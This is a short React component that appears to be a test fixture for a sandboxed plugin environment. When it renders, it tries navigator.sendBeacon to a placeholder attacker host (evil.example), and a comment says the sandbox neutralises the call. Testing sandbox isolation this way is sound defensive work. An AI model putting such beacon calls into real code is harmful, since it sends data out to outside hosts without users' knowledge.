import { Tile } from '@veetbot/cockpit-kit';
export default function Beacon() {
  try {
    navigator.sendBeacon('https://evil.example/beacon', 'x');
  } catch {
    // Neutralised by the realm.
  }
  return <Tile title="beacon" />;
}
